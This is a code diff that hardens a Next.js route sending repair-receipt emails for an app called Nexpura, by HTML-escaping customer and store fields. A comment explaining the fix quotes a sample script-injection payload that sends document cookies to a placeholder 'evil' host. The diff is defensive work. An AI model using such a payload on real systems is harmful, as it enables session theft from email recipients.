@@ -7,6 +7,7 @@ import { resend } from "@/lib/email/resend";
 import React, { type JSXElementConstructor, type ReactElement } from "react";
 import { checkRateLimit } from "@/lib/rate-limit";
 import { assertUserCanAccessLocation, LocationAccessDeniedError } from "@/lib/auth/assert-location";
+import { escapeHtml } from "@/lib/sanitize";
 
 export async function POST(
   _req: NextRequest,
@@ -122,6 +123,24 @@ export async function POST(
   const storePhone = tenant?.phone ? ` | ${tenant.phone}` : "";
   const storeAddr = tenantAddress ? ` | ${tenantAddress}` : "";
 
+  // All customer/tenant-authored fields flowing into the email HTML
+  // body are escaped. Without this, a customer named
+  // `<script>fetch('//evil/'+document.cookie)</script>` would inject
+  // live HTML into the email client rendering (blast radius = the
+  // recipient customer, but stored-injection is the classic lead-in
+  // to phishing-content overlays and broken-rendering). Pattern
+  // matches the refund-PDF HTML route which was already hardened.
+  const esc = {
+    businessName: escapeHtml(businessName),
+    ticketNumber: escapeHtml(String(ticketNumber)),
+    customerName: escapeHtml(ticketData.customerName || "Valued Customer"),
+    itemDescription: escapeHtml(ticketData.itemDescription || ticketData.itemType || "—"),
+    abn: tenant?.abn ? escapeHtml(tenant.abn) : "",
+    phone: tenant?.phone ? escapeHtml(tenant.phone) : "",
+    storePhone: escapeHtml(storePhone),
+    storeAddr: escapeHtml(storeAddr),
+  };
+
   const { error: sendError } = await resend.emails.send({
     from: `${businessName} <receipts@nexpura.com>`,
     to: [recipientEmail],
@@ -132,25 +151,25 @@ export async function POST(
 <table width="600" cellpadding="0" cellspacing="0" style="max-width:600px;width:100%;">
   <tr><td style="background:#1A1A1A;border-radius:12px 12px 0 0;padding:28px 36px;">
     <table width="100%" cellpadding="0" cellspacing="0"><tr>
-      <td><p style="margin:0;font-size:18px;font-weight:700;color:#fff;">${businessName}</p>${tenant?.abn ? `<p style="margin:4px 0 0;font-size:11px;color:rgba(255,255,255,0.5);">ABN: ${tenant.abn}</p>` : ""}</td>
-      <td align="right"><p style="margin:0;font-size:11px;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:0.08em;">REPAIR RECEIPT</p><p style="margin:3px 0 0;font-size:18px;font-weight:700;color:#8B7355;">${ticketNumber}</p></td>
+      <td><p style="margin:0;font-size:18px;font-weight:700;color:#fff;">${esc.businessName}</p>${esc.abn ? `<p style="margin:4px 0 0;font-size:11px;color:rgba(255,255,255,0.5);">ABN: ${esc.abn}</p>` : ""}</td>
+      <td align="right"><p style="margin:0;font-size:11px;color:rgba(255,255,255,0.5);text-transform:uppercase;letter-spacing:0.08em;">REPAIR RECEIPT</p><p style="margin:3px 0 0;font-size:18px;font-weight:700;color:#8B7355;">${esc.ticketNumber}</p></td>
     </tr></table>
   </td></tr>
   <tr><td style="background:#fff;padding:36px;">
-    <p style="margin:0 0 6px;font-size:15px;color:#1A1A1A;font-weight:600;">Hi ${ticketData.customerName || "Valued Customer"},</p>
+    <p style="margin:0 0 6px;font-size:15px;color:#1A1A1A;font-weight:600;">Hi ${esc.customerName},</p>
     <p style="margin:0 0 24px;font-size:14px;color:#666;line-height:1.6;">Thank you for bringing in your item. Your repair receipt is attached as a PDF. Here's a summary:</p>
     <table width="100%" cellpadding="0" cellspacing="0" style="background:#FAFAF9;border-radius:8px;margin-bottom:28px;border:1px solid #E5E2DE;"><tr><td style="padding:20px 24px;">
       <table width="100%" cellpadding="0" cellspacing="0">
-        <tr><td style="padding-bottom:12px;width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Ticket #</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${ticketNumber}</p></td>
-        <td style="padding-bottom:12px;width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Item</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${ticketData.itemDescription || ticketData.itemType || "—"}</p></td></tr>
+        <tr><td style="padding-bottom:12px;width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Ticket #</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${esc.ticketNumber}</p></td>
+        <td style="padding-bottom:12px;width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Item</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${esc.itemDescription}</p></td></tr>
         ${ticketData.quotedPrice != null ? `<tr><td style="width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Quoted Price</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">$${Number(ticketData.quotedPrice).toFixed(2)}</p></td>` : "<tr><td>"}
         <td style="width:50%;"><p style="margin:0;font-size:10px;color:#999;text-transform:uppercase;letter-spacing:0.08em;font-weight:600;">Due Date</p><p style="margin:3px 0 0;font-size:14px;color:#1A1A1A;font-weight:600;">${ticketData.dueDate ? new Date(ticketData.dueDate).toLocaleDateString("en-AU", {day:"numeric",month:"short",year:"numeric"}) : "To be advised"}</p></td></tr>
       </table>
     </td></tr></table>
-    <p style="margin:0;font-size:13px;color:#888;line-height:1.6;">We'll contact you when your item is ready for collection. If you have any questions, please reply to this email${tenant?.phone ? ` or call us at ${tenant.phone}` : ""}.</p>
+    <p style="margin:0;font-size:13px;color:#888;line-height:1.6;">We'll contact you when your item is ready for collection. If you have any questions, please reply to this email${esc.phone ? ` or call us at ${esc.phone}` : ""}.</p>
   </td></tr>
   <tr><td style="background:#F8F5F0;border-radius:0 0 12px 12px;padding:16px 36px;border-top:1px solid #E5E2DE;">
-    <p style="margin:0;font-size:11px;color:#aaa;text-align:center;">Sent by <strong>${businessName}</strong>${storePhone}${storeAddr} using <a href="https://nexpura.com" style="color:#8B7355;text-decoration:none;">Nexpura</a></p>
+    <p style="margin:0;font-size:11px;color:#aaa;text-align:center;">Sent by <strong>${esc.businessName}</strong>${esc.storePhone}${esc.storeAddr} using <a href="https://nexpura.com" style="color:#8B7355;text-decoration:none;">Nexpura</a></p>
   </td></tr>
 </table></td></tr></table></body></html>`,
     attachments: [
